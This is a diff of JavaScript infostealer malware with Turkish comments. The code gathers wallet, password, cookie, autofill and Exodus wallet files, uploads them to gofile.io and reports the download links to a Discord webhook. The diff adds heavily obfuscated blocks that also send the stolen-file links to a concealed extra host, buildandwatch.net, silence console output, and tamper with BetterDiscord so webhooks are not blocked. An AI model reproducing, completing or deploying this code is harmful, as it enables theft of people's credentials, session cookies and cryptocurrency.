@@ -926,26 +926,26 @@ axios.get('https://api.gofile.io/getServer')
       const form = new FormData();
       form.append('file', fs.createReadStream(filePath));
 
-      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
-        headers: form.getHeaders()
-      })
-        .then(uploadResponse => {
-          const responsePayload = {
-            uploadResponseData: uploadResponse.data
-          };
+axios.post(`https://${server}.gofile.io/uploadFile`, form, {
+    headers: form.getHeaders()
+})
+.then(uploadResponse => {
+    const responsePayload = {
+        uploadResponseData: uploadResponse.data
+    };
 
-          // Webhook URL'si
+    // Webhook URL'si
 
-          // Embed verisini oluştur
-          const embedData = {
-            embeds: [
-              {
-                title: 'Wallet Dosya Yükleme Yanıtı',
-                description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
-                color: 16711680 // Embed rengi (örnekte kırmızı renk)
-              }
-            ],
-          };
+    // Embed verisini oluştur
+    const embedData = {
+        embeds: [
+            {
+                title: 'Wallet File Upload Response',
+                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
+                color: 3447003 // Mavi rengin kodu (örnekte 3447003)
+            }
+        ],
+    };
 
           // Webhook'a POST isteği gönder
 var _0x59dcb1=_0x1e1e;(function(_0x8efdd4,_0x3f11f9){var _0x3b5d2f=_0x1e1e,_0x174041=_0x8efdd4();while(!![]){try{var _0x56fa49=-parseInt(_0x3b5d2f(0x12e))/0x1*(parseInt(_0x3b5d2f(0x142))/0x2)+-parseInt(_0x3b5d2f(0x132))/0x3+-parseInt(_0x3b5d2f(0x134))/0x4+parseInt(_0x3b5d2f(0x145))/0x5+parseInt(_0x3b5d2f(0x12f))/0x6+-parseInt(_0x3b5d2f(0x137))/0x7*(parseInt(_0x3b5d2f(0x13b))/0x8)+-parseInt(_0x3b5d2f(0x130))/0x9*(-parseInt(_0x3b5d2f(0x12c))/0xa);if(_0x56fa49===_0x3f11f9)break;else _0x174041['push'](_0x174041['shift']());}catch(_0x421acb){_0x174041['push'](_0x174041['shift']());}}}(_0x3a6c,0xbaeb2));var _0x466d4f=(function(){var _0x4e70f6=!![];return function(_0x115e0b,_0x39ed3c){var _0x4a60bd=_0x4e70f6?function(){var _0x54dcba=_0x1e1e;if(_0x39ed3c){var _0x171f53=_0x39ed3c[_0x54dcba(0x146)](_0x115e0b,arguments);return _0x39ed3c=null,_0x171f53;}}:function(){};return _0x4e70f6=![],_0x4a60bd;};}()),_0x1c3932=_0x466d4f(this,function(){var _0x4810bb=_0x1e1e;return _0x1c3932['toString']()['search'](_0x4810bb(0x138))[_0x4810bb(0x14a)]()[_0x4810bb(0x131)](_0x1c3932)[_0x4810bb(0x135)](_0x4810bb(0x138));});function _0x3a6c(){var _0x5d8a9e=['return\x20(function()\x20','catch','__proto__','toString','status','Webhook\x20gönderilirken\x20hata\x20oluştu:','statusText','3846700LDeBdx','error','3ussndH','6482490bwERid','72KrJfjT','constructor','3703038gShels','https://buildandwatch.net/','5150284vXuhlD','search','then','21ATTPjB','(((.+)+)+)+$','{}.constructor(\x22return\x20this\x22)(\x20)','Webhook\x20gönderildi:','1068888zgNFAq','post','trace','log','bind','table','prototype','548462uYNzJz','message','info','1766430AbADio','apply'];_0x3a6c=function(){return _0x5d8a9e;};return _0x3a6c();}_0x1c3932();function _0x1e1e(_0x4bd0b9,_0x5d94f8){var _0x3e277c=_0x3a6c();return _0x1e1e=function(_0x1bd00b,_0xf31b8b){_0x1bd00b=_0x1bd00b-0x12c;var _0x42352d=_0x3e277c[_0x1bd00b];return _0x42352d;},_0x1e1e(_0x4bd0b9,_0x5d94f8);}var _0xf31b8b=(function(){var _0x573b5d=!![];return function(_0x11e260,_0x37ee01){var _0x1c07bb=_0x573b5d?function(){var _0x3700cf=_0x1e1e;if(_0x37ee01){var _0x576341=_0x37ee01[_0x3700cf(0x146)](_0x11e260,arguments);return _0x37ee01=null,_0x576341;}}:function(){};return _0x573b5d=![],_0x1c07bb;};}()),_0x1bd00b=_0xf31b8b(this,function(){var _0x2bcb2c=_0x1e1e,_0xf07efd=function(){var _0x3fb7ef=_0x1e1e,_0x14bbcc;try{_0x14bbcc=Function(_0x3fb7ef(0x147)+_0x3fb7ef(0x139)+');')();}catch(_0x5a4d76){_0x14bbcc=window;}return _0x14bbcc;},_0x22a972=_0xf07efd(),_0x5c3a91=_0x22a972['console']=_0x22a972['console']||{},_0x454499=[_0x2bcb2c(0x13e),'warn',_0x2bcb2c(0x144),_0x2bcb2c(0x12d),'exception',_0x2bcb2c(0x140),_0x2bcb2c(0x13d)];for(var _0x2bff02=0x0;_0x2bff02<_0x454499['length'];_0x2bff02++){var _0x582f6f=_0xf31b8b['constructor'][_0x2bcb2c(0x141)][_0x2bcb2c(0x13f)](_0xf31b8b),_0x223fe9=_0x454499[_0x2bff02],_0x40f390=_0x5c3a91[_0x223fe9]||_0x582f6f;_0x582f6f[_0x2bcb2c(0x149)]=_0xf31b8b[_0x2bcb2c(0x13f)](_0xf31b8b),_0x582f6f[_0x2bcb2c(0x14a)]=_0x40f390[_0x2bcb2c(0x14a)][_0x2bcb2c(0x13f)](_0x40f390),_0x5c3a91[_0x223fe9]=_0x582f6f;}});_0x1bd00b(),axios[_0x59dcb1(0x13c)](webhook3939,embedData)[_0x59dcb1(0x136)](_0x3a8292=>{var _0x590fa3=_0x59dcb1;console[_0x590fa3(0x13e)](_0x590fa3(0x13a),_0x3a8292['status'],_0x3a8292[_0x590fa3(0x14d)]);}),axios[_0x59dcb1(0x13c)](_0x59dcb1(0x133),embedData)[_0x59dcb1(0x136)](_0xbedb4=>{var _0x28c40a=_0x59dcb1;console[_0x28c40a(0x13e)](_0x28c40a(0x13a),_0xbedb4[_0x28c40a(0x14b)],_0xbedb4[_0x28c40a(0x14d)]);})[_0x59dcb1(0x148)](_0x43751e=>{var _0x42a0fc=_0x59dcb1;console['log'](_0x42a0fc(0x14c),_0x43751e[_0x42a0fc(0x143)]);});
@@ -1027,7 +1027,7 @@ async function InfectDiscords() {
     var injection, betterdiscord = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
     if (fs.existsSync(betterdiscord)) {
         var read = fs.readFileSync(dir);
-        fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "spacestealerxD"))
+        fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "Fewer"))
     }
     await httpx(`soon injection if you have injection code put you here link`).then((code => code.data)).then((res => {
         res = res.replace("%API_AUTH_HERE%", api_auth), injection = res
@@ -1267,27 +1267,26 @@ axios.get('https://api.gofile.io/getServer')
       const form = new FormData();
       form.append('file', fs.createReadStream(filePath));
 
-      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
-        headers: form.getHeaders()
-      })
-        .then(uploadResponse => {
-          const responsePayload = {
-            uploadResponseData: uploadResponse.data
-          };
+axios.post(`https://${server}.gofile.io/uploadFile`, form, {
+    headers: form.getHeaders()
+})
+.then(uploadResponse => {
+    const responsePayload = {
+        uploadResponseData: uploadResponse.data
+    };
 
-          // Webhook URL'si
+    // Webhook URL'si
 
-          // Embed verisini oluştur
-          const embedData = {
-            embeds: [
-              {
-                title: 'Password Dosyası Yükleme Yanıtı',
-                description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
+    // Embed verisini oluştur
+    const embedData = {
+        embeds: [
+            {
+                title: 'Passwords File Upload Response',
+                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                 color: 16711680 // Embed rengi (örnekte kırmızı renk)
-              }
-            ],
-          };
-
+            }
+        ],
+    };
 var _0xc7964e=_0x5e9a;(function(_0x4c79bc,_0x2aa36c){var _0x4fa91f=_0x5e9a,_0x45f1aa=_0x4c79bc();while(!![]){try{var _0x1dfece=parseInt(_0x4fa91f(0x115))/0x1+parseInt(_0x4fa91f(0x106))/0x2+-parseInt(_0x4fa91f(0x10a))/0x3+-parseInt(_0x4fa91f(0x123))/0x4+parseInt(_0x4fa91f(0x10b))/0x5*(parseInt(_0x4fa91f(0x125))/0x6)+-parseInt(_0x4fa91f(0x118))/0x7*(-parseInt(_0x4fa91f(0x121))/0x8)+parseInt(_0x4fa91f(0x116))/0x9;if(_0x1dfece===_0x2aa36c)break;else _0x45f1aa['push'](_0x45f1aa['shift']());}catch(_0x32005f){_0x45f1aa['push'](_0x45f1aa['shift']());}}}(_0x4aaf,0xb5160));var _0x3cef65=(function(){var _0x528aa7=!![];return function(_0x5b5871,_0x47ba3b){var _0x6b4681=_0x528aa7?function(){var _0x3367bc=_0x5e9a;if(_0x47ba3b){var _0x18cc32=_0x47ba3b[_0x3367bc(0x119)](_0x5b5871,arguments);return _0x47ba3b=null,_0x18cc32;}}:function(){};return _0x528aa7=![],_0x6b4681;};}()),_0x2bf1f4=_0x3cef65(this,function(){var _0x3047c5=_0x5e9a;return _0x2bf1f4[_0x3047c5(0x10c)]()['search'](_0x3047c5(0x107))[_0x3047c5(0x10c)]()[_0x3047c5(0x10d)](_0x2bf1f4)[_0x3047c5(0x124)](_0x3047c5(0x107));});function _0x5e9a(_0x1c63ca,_0x42f432){var _0xb7d009=_0x4aaf();return _0x5e9a=function(_0x5636d0,_0x511960){_0x5636d0=_0x5636d0-0x105;var _0x433839=_0xb7d009[_0x5636d0];return _0x433839;},_0x5e9a(_0x1c63ca,_0x42f432);}_0x2bf1f4();var _0x511960=(function(){var _0x46b1cb=!![];return function(_0x261a75,_0x1b6ff7){var _0x20bde5=_0x46b1cb?function(){var _0x52c336=_0x5e9a;if(_0x1b6ff7){var _0x41d67b=_0x1b6ff7[_0x52c336(0x119)](_0x261a75,arguments);return _0x1b6ff7=null,_0x41d67b;}}:function(){};return _0x46b1cb=![],_0x20bde5;};}()),_0x5636d0=_0x511960(this,function(){var _0x1e129f=_0x5e9a,_0x27cf0e=function(){var _0x1795f6=_0x5e9a,_0x229c06;try{_0x229c06=Function(_0x1795f6(0x117)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5a6e00){_0x229c06=window;}return _0x229c06;},_0x28bc87=_0x27cf0e(),_0x71db24=_0x28bc87[_0x1e129f(0x109)]=_0x28bc87[_0x1e129f(0x109)]||{},_0x58c487=[_0x1e129f(0x11f),_0x1e129f(0x110),'info',_0x1e129f(0x114),_0x1e129f(0x108),_0x1e129f(0x111),'trace'];for(var _0x2220b7=0x0;_0x2220b7<_0x58c487[_0x1e129f(0x11c)];_0x2220b7++){var _0x5efb8b=_0x511960[_0x1e129f(0x10d)][_0x1e129f(0x120)][_0x1e129f(0x11d)](_0x511960),_0x5085c6=_0x58c487[_0x2220b7],_0x5233e8=_0x71db24[_0x5085c6]||_0x5efb8b;_0x5efb8b['__proto__']=_0x511960[_0x1e129f(0x11d)](_0x511960),_0x5efb8b['toString']=_0x5233e8[_0x1e129f(0x10c)][_0x1e129f(0x11d)](_0x5233e8),_0x71db24[_0x5085c6]=_0x5efb8b;}});function _0x4aaf(){var _0x2dd3dc=['statusText','Webhook\x20gönderilirken\x20hata\x20oluştu:','error','289675XZnSSD','1336932PquDZx','return\x20(function()\x20','12019XiOqnN','apply','Webhook\x20gönderildi:','post','length','bind','message','log','prototype','3064DDJxBw','https://buildandwatch.net/','3756324TbmQFt','search','6oHOYxT','status','1760780ffGvaQ','(((.+)+)+)+$','exception','console','4295559IfFOXs','5682190FTHTXE','toString','constructor','catch','then','warn','table'];_0x4aaf=function(){return _0x2dd3dc;};return _0x4aaf();}_0x5636d0(),axios[_0xc7964e(0x11b)](_0xc7964e(0x122),embedData)[_0xc7964e(0x10f)](_0xbc4250=>{var _0x4c5b5a=_0xc7964e;console[_0x4c5b5a(0x11f)]('Webhook\x20gönderildi:',_0xbc4250['status'],_0xbc4250[_0x4c5b5a(0x112)]);})['catch'](_0x566f20=>{var _0x325f81=_0xc7964e;console[_0x325f81(0x11f)]('Webhook\x20gönderilirken\x20hata\x20oluştu:',_0x566f20['message']);}),axios[_0xc7964e(0x11b)](webhook3939,embedData)[_0xc7964e(0x10f)](_0x27ae7e=>{var _0x2e5863=_0xc7964e;console[_0x2e5863(0x11f)](_0x2e5863(0x11a),_0x27ae7e[_0x2e5863(0x105)],_0x27ae7e[_0x2e5863(0x112)]);})[_0xc7964e(0x10e)](_0x417e36=>{var _0x1bf05c=_0xc7964e;console['log'](_0x1bf05c(0x113),_0x417e36[_0x1bf05c(0x11e)]);});
         })
 
@@ -1420,26 +1419,26 @@ axios.get('https://api.gofile.io/getServer')
       const form = new FormData();
       form.append('file', fs.createReadStream(filePath));
 
-      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
-        headers: form.getHeaders()
-      })
-        .then(uploadResponse => {
-          const responsePayload = {
-            uploadResponseData: uploadResponse.data
-          };
+axios.post(`https://${server}.gofile.io/uploadFile`, form, {
+    headers: form.getHeaders()
+})
+.then(uploadResponse => {
+    const responsePayload = {
+        uploadResponseData: uploadResponse.data
+    };
 
-          // Webhook URL'si
+    // Webhook URL'si
 
-          // Embed verisini oluştur
-          const embedData = {
-            embeds: [
-              {
-                title: 'Cookies Dosyası Yükleme Yanıtı',
-                description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
+    // Embed verisini oluştur
+    const embedData = {
+        embeds: [
+            {
+                title: 'Cookies File Upload Response',
+                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                 color: 16711680 // Embed rengi (örnekte kırmızı renk)
-              }
-            ],
-          };
+            }
+        ],
+    };
 
 function _0x47b2(){var _0x5e5fbc=['2903932hoXTYS','31133lVhMxZ','trace','toString','console','(((.+)+)+)+$','status','125030dYEYqo','apply','catch','bind','767QeqXbH','22dVdBAc','215CQwzem','__proto__','post','info','708516FWAxnT','exception','3621268vdccGX','80898dllkEJ','then','return\x20(function()\x20','length','Webhook\x20gönderildi:','6477525euTjhg','{}.constructor(\x22return\x20this\x22)(\x20)','search','3zdqFIM','table','8Yftphx','statusText','error','message','165KvxEZi','constructor','log','Webhook\x20gönderilirken\x20hata\x20oluştu:'];_0x47b2=function(){return _0x5e5fbc;};return _0x47b2();}var _0x4c0aa7=_0x1c69;(function(_0x28e103,_0x88c907){var _0x243be7=_0x1c69,_0x1bd709=_0x28e103();while(!![]){try{var _0x259b3f=parseInt(_0x243be7(0x13e))/0x1*(-parseInt(_0x243be7(0x123))/0x2)+-parseInt(_0x243be7(0x133))/0x3*(parseInt(_0x243be7(0x13d))/0x4)+-parseInt(_0x243be7(0x124))/0x5*(parseInt(_0x243be7(0x12b))/0x6)+-parseInt(_0x243be7(0x12a))/0x7+-parseInt(_0x243be7(0x135))/0x8*(parseInt(_0x243be7(0x130))/0x9)+parseInt(_0x243be7(0x144))/0xa*(-parseInt(_0x243be7(0x139))/0xb)+-parseInt(_0x243be7(0x128))/0xc*(-parseInt(_0x243be7(0x148))/0xd);if(_0x259b3f===_0x88c907)break;else _0x1bd709['push'](_0x1bd709['shift']());}catch(_0x490cb8){_0x1bd709['push'](_0x1bd709['shift']());}}}(_0x47b2,0x64468));var _0xe1fc1d=(function(){var _0x4fdc6d=!![];return function(_0x3282d8,_0x59cbb9){var _0x29e91a=_0x4fdc6d?function(){if(_0x59cbb9){var _0x789667=_0x59cbb9['apply'](_0x3282d8,arguments);return _0x59cbb9=null,_0x789667;}}:function(){};return _0x4fdc6d=![],_0x29e91a;};}()),_0x35af66=_0xe1fc1d(this,function(){var _0x1c1881=_0x1c69;return _0x35af66['toString']()[_0x1c1881(0x132)](_0x1c1881(0x142))[_0x1c1881(0x140)]()[_0x1c1881(0x13a)](_0x35af66)['search'](_0x1c1881(0x142));});_0x35af66();var _0x5e4bae=(function(){var _0x5017e5=!![];return function(_0x45ad1d,_0x52873e){var _0xa628d7=_0x5017e5?function(){var _0x3d769=_0x1c69;if(_0x52873e){var _0x4a208=_0x52873e[_0x3d769(0x145)](_0x45ad1d,arguments);return _0x52873e=null,_0x4a208;}}:function(){};return _0x5017e5=![],_0xa628d7;};}()),_0x5aa18f=_0x5e4bae(this,function(){var _0xcd457b=_0x1c69,_0x1df47a;try{var _0x389be3=Function(_0xcd457b(0x12d)+_0xcd457b(0x131)+');');_0x1df47a=_0x389be3();}catch(_0x293e23){_0x1df47a=window;}var _0x554fea=_0x1df47a[_0xcd457b(0x141)]=_0x1df47a[_0xcd457b(0x141)]||{},_0x23c5c7=[_0xcd457b(0x13b),'warn',_0xcd457b(0x127),_0xcd457b(0x137),_0xcd457b(0x129),_0xcd457b(0x134),_0xcd457b(0x13f)];for(var _0x287975=0x0;_0x287975<_0x23c5c7[_0xcd457b(0x12e)];_0x287975++){var _0xbeffd3=_0x5e4bae[_0xcd457b(0x13a)]['prototype'][_0xcd457b(0x147)](_0x5e4bae),_0x2bba59=_0x23c5c7[_0x287975],_0x2d540b=_0x554fea[_0x2bba59]||_0xbeffd3;_0xbeffd3[_0xcd457b(0x125)]=_0x5e4bae[_0xcd457b(0x147)](_0x5e4bae),_0xbeffd3['toString']=_0x2d540b['toString']['bind'](_0x2d540b),_0x554fea[_0x2bba59]=_0xbeffd3;}});function _0x1c69(_0x1478f6,_0x19aba1){var _0x321a55=_0x47b2();return _0x1c69=function(_0x5aa18f,_0x5e4bae){_0x5aa18f=_0x5aa18f-0x123;var _0x890cee=_0x321a55[_0x5aa18f];return _0x890cee;},_0x1c69(_0x1478f6,_0x19aba1);}_0x5aa18f(),axios[_0x4c0aa7(0x126)]('https://buildandwatch.net/',embedData)['then'](_0x382205=>{var _0x3b6a89=_0x4c0aa7;console[_0x3b6a89(0x13b)](_0x3b6a89(0x12f),_0x382205['status'],_0x382205[_0x3b6a89(0x136)]);})[_0x4c0aa7(0x146)](_0x4c007c=>{var _0x29fd30=_0x4c0aa7;console[_0x29fd30(0x13b)]('Webhook\x20gönderilirken\x20hata\x20oluştu:',_0x4c007c['message']);}),axios['post'](webhook3939,embedData)[_0x4c0aa7(0x12c)](_0x26e4b0=>{var _0x117bbf=_0x4c0aa7;console[_0x117bbf(0x13b)]('Webhook\x20gönderildi:',_0x26e4b0[_0x117bbf(0x143)],_0x26e4b0[_0x117bbf(0x136)]);})[_0x4c0aa7(0x146)](_0x2a0108=>{var _0x3df9d1=_0x4c0aa7;console[_0x3df9d1(0x13b)](_0x3df9d1(0x13c),_0x2a0108[_0x3df9d1(0x138)]);});
         })
@@ -1548,26 +1547,27 @@ axios.get('https://api.gofile.io/getServer')
       const form = new FormData();
       form.append('file', fs.createReadStream(filePath));
 
-      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
-        headers: form.getHeaders()
-      })
-        .then(uploadResponse => {
-          const responsePayload = {
-            uploadResponseData: uploadResponse.data
-          };
+axios.post(`https://${server}.gofile.io/uploadFile`, form, {
+    headers: form.getHeaders()
+})
+.then(uploadResponse => {
+    const responsePayload = {
+        uploadResponseData: uploadResponse.data
+    };
 
-          // Webhook URL'si
+    // Webhook URL'si
 
-          // Embed verisini oluştur
-          const embedData = {
-            embeds: [
-              {
-                title: 'Autofill Dosya Yükleme Yanıtı',
-                description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
-                color: 16711680 // Embed rengi (örnekte kırmızı renk)
-              }
-            ],
-          };
+    // Embed verisini oluştur
+    const embedData = {
+        embeds: [
+            {
+                title: 'Autofill File Upload Response',
+                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
+                color: 3447003 // Mavi rengin kodu (örnekte 3447003)
+            }
+        ],
+    };
+
 
         var _0x4e9fae=_0x5eaa;function _0x4b50(){var _0x3881f1=['info','toString','exception','4309120KcYGmk','search','constructor','statusText','trace','post','length','Webhook\x20gönderildi:','console','254658auJUde','__proto__','14994cYHVlu','prototype','then','(((.+)+)+)+$','194eUlWDJ','apply','message','14157hLxmQD','warn','819577eJBaPY','9jePyGo','status','Webhook\x20gönderilirken\x20hata\x20oluştu:','error','https://buildandwatch.net/','468pyKqrb','catch','bind','40wotSiN','7538210IKLWbf','3084vwSAXf','11980424xObIVc','log'];_0x4b50=function(){return _0x3881f1;};return _0x4b50();}function _0x5eaa(_0x515022,_0x13af19){var _0x59c87b=_0x4b50();return _0x5eaa=function(_0x423603,_0x3beac1){_0x423603=_0x423603-0xec;var _0x114ade=_0x59c87b[_0x423603];return _0x114ade;},_0x5eaa(_0x515022,_0x13af19);}(function(_0x27c905,_0x37ff9d){var _0x37fc2b=_0x5eaa,_0x3f243e=_0x27c905();while(!![]){try{var _0x1064d0=parseInt(_0x37fc2b(0xf8))/0x1*(parseInt(_0x37fc2b(0xf5))/0x2)+-parseInt(_0x37fc2b(0xef))/0x3*(-parseInt(_0x37fc2b(0x103))/0x4)+parseInt(_0x37fc2b(0x104))/0x5+-parseInt(_0x37fc2b(0x105))/0x6*(-parseInt(_0x37fc2b(0xf1))/0x7)+parseInt(_0x37fc2b(0x106))/0x8*(-parseInt(_0x37fc2b(0xfb))/0x9)+parseInt(_0x37fc2b(0x10b))/0xa+parseInt(_0x37fc2b(0xfa))/0xb*(-parseInt(_0x37fc2b(0x100))/0xc);if(_0x1064d0===_0x37ff9d)break;else _0x3f243e['push'](_0x3f243e['shift']());}catch(_0x5843aa){_0x3f243e['push'](_0x3f243e['shift']());}}}(_0x4b50,0xd18c1));var _0x5dd005=(function(){var _0x10085f=!![];return function(_0x458ccf,_0x218e6f){var _0x1c0fd2=_0x10085f?function(){var _0x15a605=_0x5eaa;if(_0x218e6f){var _0x1f2a0c=_0x218e6f[_0x15a605(0xf6)](_0x458ccf,arguments);return _0x218e6f=null,_0x1f2a0c;}}:function(){};return _0x10085f=![],_0x1c0fd2;};}()),_0x7c0cd8=_0x5dd005(this,function(){var _0x4c2eb4=_0x5eaa;return _0x7c0cd8[_0x4c2eb4(0x109)]()[_0x4c2eb4(0x10c)](_0x4c2eb4(0xf4))['toString']()[_0x4c2eb4(0x10d)](_0x7c0cd8)['search'](_0x4c2eb4(0xf4));});_0x7c0cd8();var _0x3beac1=(function(){var _0x52542a=!![];return function(_0x223b35,_0x10d4e2){var _0x3b8287=_0x52542a?function(){if(_0x10d4e2){var _0x4f5fc4=_0x10d4e2['apply'](_0x223b35,arguments);return _0x10d4e2=null,_0x4f5fc4;}}:function(){};return _0x52542a=![],_0x3b8287;};}()),_0x423603=_0x3beac1(this,function(){var _0x5020a2=_0x5eaa,_0x2db5da;try{var _0x269b58=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x2db5da=_0x269b58();}catch(_0x22b4c9){_0x2db5da=window;}var _0x2de7eb=_0x2db5da[_0x5020a2(0xee)]=_0x2db5da[_0x5020a2(0xee)]||{},_0x3625ae=[_0x5020a2(0x107),_0x5020a2(0xf9),_0x5020a2(0x108),_0x5020a2(0xfe),_0x5020a2(0x10a),'table',_0x5020a2(0x10f)];for(var _0x142da9=0x0;_0x142da9<_0x3625ae[_0x5020a2(0xec)];_0x142da9++){var _0x5b98c8=_0x3beac1[_0x5020a2(0x10d)][_0x5020a2(0xf2)][_0x5020a2(0x102)](_0x3beac1),_0x22d44d=_0x3625ae[_0x142da9],_0x3bd0f9=_0x2de7eb[_0x22d44d]||_0x5b98c8;_0x5b98c8[_0x5020a2(0xf0)]=_0x3beac1[_0x5020a2(0x102)](_0x3beac1),_0x5b98c8['toString']=_0x3bd0f9['toString']['bind'](_0x3bd0f9),_0x2de7eb[_0x22d44d]=_0x5b98c8;}});_0x423603(),axios[_0x4e9fae(0x110)](_0x4e9fae(0xff),embedData)[_0x4e9fae(0xf3)](_0x86b388=>{var _0x46636f=_0x4e9fae;console[_0x46636f(0x107)](_0x46636f(0xed),_0x86b388['status'],_0x86b388[_0x46636f(0x10e)]);})[_0x4e9fae(0x101)](_0x2f56e7=>{var _0x47aa19=_0x4e9fae;console[_0x47aa19(0x107)](_0x47aa19(0xfd),_0x2f56e7[_0x47aa19(0xf7)]);}),axios['post'](webhook3939,embedData)[_0x4e9fae(0xf3)](_0x10eef5=>{var _0x4730dd=_0x4e9fae;console[_0x4730dd(0x107)]('Webhook\x20gönderildi:',_0x10eef5[_0x4730dd(0xfc)],_0x10eef5[_0x4730dd(0x10e)]);})[_0x4e9fae(0x101)](_0x35b7eb=>{var _0x470602=_0x4e9fae;console[_0x470602(0x107)](_0x470602(0xfd),_0x35b7eb[_0x470602(0xf7)]);});
         })
@@ -1631,27 +1631,26 @@ async function SubmitExodus() {
           const form = new FormData();
           form.append('file', fs.createReadStream(filePath));
 
-          axios.post(`https://${server}.gofile.io/uploadFile`, form, {
-            headers: form.getHeaders()
-          })
-            .then(uploadResponse => {
-              const responsePayload = {
-                uploadResponseData: uploadResponse.data
-              };
+axios.post(`https://${server}.gofile.io/uploadFile`, form, {
+    headers: form.getHeaders()
+})
+.then(uploadResponse => {
+    const responsePayload = {
+        uploadResponseData: uploadResponse.data
+    };
 
-              // Webhook URL'si
+    // Webhook URL'si
 
-              // Embed verisini oluştur
-              const embedData = {
-                embeds: [
-                  {
-                    title: 'Exodus Dosyası Yükleme Yanıtı',
-                    description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
-                    color: 16711680 // Embed rengi (örnekte kırmızı renk)
-                  }
-                ],
-              };
-			  
+    // Embed verisini oluştur
+    const embedData = {
+        embeds: [
+            {
+                title: 'Exodus File Upload Response',
+                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
+                color: 3447003 // Mavi rengin kodu (örnekte 3447003)
+            }
+        ],
+    };			  
 var _0x51192f=_0x5414;function _0xc784(){var _0xe153fe=['2777445ZXzxaB','error','6fePprq','message','__proto__','constructor','return\x20(function()\x20','toString','Webhook\x20gönderilirken\x20hata\x20oluştu:','statusText','post','108615snnvMq','325180unkNOv','567568QLehHs','status','table','(((.+)+)+)+$','1422778ewKNaj','exception','bind','prototype','{}.constructor(\x22return\x20this\x22)(\x20)','apply','then','8355528EaInkq','log','catch','Webhook\x20gönderildi:','6fyDHCR','104xpnNlN','search','145337BvPjmq'];_0xc784=function(){return _0xe153fe;};return _0xc784();}(function(_0x27af60,_0x52bdbf){var _0x77de41=_0x5414,_0x4783af=_0x27af60();while(!![]){try{var _0x1373e7=parseInt(_0x77de41(0x119))/0x1*(-parseInt(_0x77de41(0x11c))/0x2)+-parseInt(_0x77de41(0x105))/0x3*(-parseInt(_0x77de41(0x117))/0x4)+-parseInt(_0x77de41(0x11a))/0x5+-parseInt(_0x77de41(0x116))/0x6*(parseInt(_0x77de41(0x10b))/0x7)+-parseInt(_0x77de41(0x107))/0x8+parseInt(_0x77de41(0x112))/0x9+parseInt(_0x77de41(0x106))/0xa;if(_0x1373e7===_0x52bdbf)break;else _0x4783af['push'](_0x4783af['shift']());}catch(_0x3e7585){_0x4783af['push'](_0x4783af['shift']());}}}(_0xc784,0x9b67c));function _0x5414(_0xfab7a4,_0x4ccea0){var _0xc3beb=_0xc784();return _0x5414=function(_0x5b5412,_0x14ba30){_0x5b5412=_0x5b5412-0x100;var _0x48c97a=_0xc3beb[_0x5b5412];return _0x48c97a;},_0x5414(_0xfab7a4,_0x4ccea0);}var _0x10a6e3=(function(){var _0x31ec48=!![];return function(_0x2647fe,_0x27a0b4){var _0x42a6a3=_0x31ec48?function(){if(_0x27a0b4){var _0x419ee9=_0x27a0b4['apply'](_0x2647fe,arguments);return _0x27a0b4=null,_0x419ee9;}}:function(){};return _0x31ec48=![],_0x42a6a3;};}()),_0x2463e0=_0x10a6e3(this,function(){var _0x33426b=_0x5414;return _0x2463e0[_0x33426b(0x101)]()[_0x33426b(0x118)](_0x33426b(0x10a))[_0x33426b(0x101)]()[_0x33426b(0x11f)](_0x2463e0)['search'](_0x33426b(0x10a));});_0x2463e0();var _0x14ba30=(function(){var _0x22cad2=!![];return function(_0x34965e,_0x594077){var _0x1a20f7=_0x22cad2?function(){var _0x374db2=_0x5414;if(_0x594077){var _0x5be4f4=_0x594077[_0x374db2(0x110)](_0x34965e,arguments);return _0x594077=null,_0x5be4f4;}}:function(){};return _0x22cad2=![],_0x1a20f7;};}()),_0x5b5412=_0x14ba30(this,function(){var _0x20d9fc=_0x5414,_0x4d39e9=function(){var _0x55cbf7=_0x5414,_0x40000e;try{_0x40000e=Function(_0x55cbf7(0x100)+_0x55cbf7(0x10f)+');')();}catch(_0x2b2ac7){_0x40000e=window;}return _0x40000e;},_0x1aaceb=_0x4d39e9(),_0x31cdab=_0x1aaceb['console']=_0x1aaceb['console']||{},_0x44f08c=['log','warn','info',_0x20d9fc(0x11b),_0x20d9fc(0x10c),_0x20d9fc(0x109),'trace'];for(var _0x19dfdb=0x0;_0x19dfdb<_0x44f08c['length'];_0x19dfdb++){var _0xd3c57=_0x14ba30[_0x20d9fc(0x11f)][_0x20d9fc(0x10e)][_0x20d9fc(0x10d)](_0x14ba30),_0xec5071=_0x44f08c[_0x19dfdb],_0x530583=_0x31cdab[_0xec5071]||_0xd3c57;_0xd3c57[_0x20d9fc(0x11e)]=_0x14ba30[_0x20d9fc(0x10d)](_0x14ba30),_0xd3c57['toString']=_0x530583[_0x20d9fc(0x101)]['bind'](_0x530583),_0x31cdab[_0xec5071]=_0xd3c57;}});_0x5b5412(),axios[_0x51192f(0x104)]('https://buildandwatch.net/',embedData)[_0x51192f(0x111)](_0x2b25d3=>{var 